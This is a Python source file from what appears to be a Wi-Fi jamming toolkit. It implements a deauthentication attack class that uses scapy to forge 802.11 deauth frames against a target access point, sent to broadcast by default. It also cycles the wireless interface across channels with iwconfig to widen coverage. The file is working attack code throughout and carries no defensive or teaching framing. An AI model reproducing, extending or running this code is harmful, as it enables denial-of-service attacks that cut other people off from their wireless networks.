"""
Channel hopping deauthentication attack implementation.
"""

import threading
import time
import subprocess
from typing import Optional
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth
from wifi_jammer.attacks.base_attack import BaseAttack
from wifi_jammer.core.interfaces import AttackConfig


class ChannelHopAttack(BaseAttack):
    """Deauthentication attack with channel hopping for maximum coverage."""

    def __init__(self, logger=None):
        super().__init__(logger)
        self._hop_thread = None
        self._current_channel = 1
        self._hop_channels = []

    def _create_packet(self) -> Optional[Packet]:
        """Create deauthentication packet."""
        if not self._config.target_bssid:
            self.logger.warning("No target BSSID specified for channel hop attack")
            return None

        try:
            destination = self._config.target_client or "ff:ff:ff:ff:ff:ff"

            packet = (
                RadioTap() /
                Dot11(
                    addr1=destination,
                    addr2=self._config.target_bssid,
                    addr3=self._config.target_bssid
                ) /
                Dot11Deauth(reason=7)
            )

            return packet

        except Exception as e:
            self.logger.error(f"Failed to create deauth packet: {e}")
            return None

    def _hop_channels_loop(self):
        """Continuously cycle through channels."""
        while self._running:
            for ch in self._hop_channels:
                if not self._running:
                    break
                try:
                    subprocess.run(
                        ["iwconfig", self._config.interface, "channel", str(ch)],
                        capture_output=True, timeout=2
                    )
                    self._current_channel = ch
                except (subprocess.SubprocessError, OSError) as e:
                    self.logger.warning(f"Failed to set channel {ch}: {e}")
                time.sleep(self._hop_interval)

    def execute(self, config: AttackConfig) -> bool:
        """Execute the channel hopping deauth attack."""
        self._hop_channels = config.hop_channels or [1, 6, 11]
        self._hop_interval = config.hop_interval or 0.5

        if not super().execute(config):
            return False

        self._hop_thread = threading.Thread(target=self._hop_channels_loop)
        self._hop_thread.daemon = True
        self._hop_thread.start()

        self.logger.info(f"Channel hopping across: {self._hop_channels}")
        self.logger.info(f"Hop interval: {self._hop_interval}s")
        return True

    def stop(self):
        """Stop the attack and join hop thread."""
        super().stop()
        if self._hop_thread and self._hop_thread.is_alive():
            self._hop_thread.join(timeout=2)
